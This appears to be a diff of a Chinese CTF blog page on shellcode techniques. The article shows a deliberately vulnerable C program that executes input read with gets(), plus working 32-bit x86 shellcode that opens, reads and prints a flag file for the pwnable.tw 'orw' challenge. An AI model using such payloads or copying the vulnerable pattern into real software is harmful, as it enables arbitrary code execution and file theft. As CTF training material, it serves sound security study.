@@ -81,23 +81,23 @@
 
 
 
-<meta name="description" content="这里总结一下shellcode的各种类型 一、直接调用12345678#include &amp;lt;stdio.h&amp;gt;int main(int argc, char const *argv[])&amp;#123;	char s[0x500];	gets(s);	((void(*)(void))s)();	return 0;&amp;#125; 直接执行shellcode，考查对shellcode的编写能力，pw">
+<meta name="description" content="这里总结一下shellcode的各种类型 一、直接调用12345678#include &amp;lt;stdio.h&amp;gt;int main(int argc, char const *argv[])&amp;#123;	char s[0x500];	gets(s);	((void(*)(void))s)();	return 0;&amp;#125;">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="shellcode 的艺术">
 <meta property="og:url" content="http://yoursite.com/2019/10/26/shellcode的艺术/index.html">
 <meta property="og:site_name" content="R4bb1t的ctf博客">
-<meta property="og:description" content="这里总结一下shellcode的各种类型 一、直接调用12345678#include &amp;lt;stdio.h&amp;gt;int main(int argc, char const *argv[])&amp;#123;	char s[0x500];	gets(s);	((void(*)(void))s)();	return 0;&amp;#125; 直接执行shellcode，考查对shellcode的编写能力，pw">
+<meta property="og:description" content="这里总结一下shellcode的各种类型 一、直接调用12345678#include &amp;lt;stdio.h&amp;gt;int main(int argc, char const *argv[])&amp;#123;	char s[0x500];	gets(s);	((void(*)(void))s)();	return 0;&amp;#125;">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/images/shellcode_1.jpg">
 <meta property="og:image" content="http://yoursite.com/images/shellcode_2.jpg">
 <meta property="og:image" content="http://yoursite.com/images/shellcode_3.jpg">
 <meta property="og:image" content="http://yoursite.com/images/shellcode_4.jpg">
 <meta property="og:image" content="http://yoursite.com/images/shellcode_5.jpg">
-<meta property="og:updated_time" content="2019-10-30T12:13:51.149Z">
+<meta property="og:updated_time" content="2019-10-30T12:18:31.711Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="shellcode 的艺术">
-<meta name="twitter:description" content="这里总结一下shellcode的各种类型 一、直接调用12345678#include &amp;lt;stdio.h&amp;gt;int main(int argc, char const *argv[])&amp;#123;	char s[0x500];	gets(s);	((void(*)(void))s)();	return 0;&amp;#125; 直接执行shellcode，考查对shellcode的编写能力，pw">
+<meta name="twitter:description" content="这里总结一下shellcode的各种类型 一、直接调用12345678#include &amp;lt;stdio.h&amp;gt;int main(int argc, char const *argv[])&amp;#123;	char s[0x500];	gets(s);	((void(*)(void))s)();	return 0;&amp;#125;">
 <meta name="twitter:image" content="http://yoursite.com/images/shellcode_1.jpg">
 
 
@@ -393,6 +393,7 @@
       
         <p>这里总结一下shellcode的各种类型</p>
 <h2 id="一、直接调用"><a href="#一、直接调用" class="headerlink" title="一、直接调用"></a>一、直接调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">0x500</span>];</span><br><span class="line">	gets(s);</span><br><span class="line">	((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))s)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 <p>直接执行shellcode，考查对shellcode的编写能力，pwntool可以直接生成<code>shellcraft.sh()</code>，没什么难度</p>
 <h2 id="二、禁用了system"><a href="#二、禁用了system" class="headerlink" title="二、禁用了system"></a>二、禁用了system</h2><p>参考pwnable.tw的orw，这种不能直接get shell，但是可以编写shellcode实现<code>fp = open(&quot;flag&quot;) ,read(fp,buf,0x30),write(1,buf,0x30)</code>来读取flag</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line">payload = <span class="string">'''</span></span><br><span class="line"><span class="string">/*fp = open("/home/orw/flag")*/</span></span><br><span class="line"><span class="string">push 0x00006761</span></span><br><span class="line"><span class="string">push 0x6c662f77</span></span><br><span class="line"><span class="string">push 0x726f2f65</span></span><br><span class="line"><span class="string">push 0x6d6f682f</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">/*read(fd,buf,0x100)*/</span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x30</span></span><br><span class="line"><span class="string">mov eax,0x3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">/*write(1,buf,0x100)*/</span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
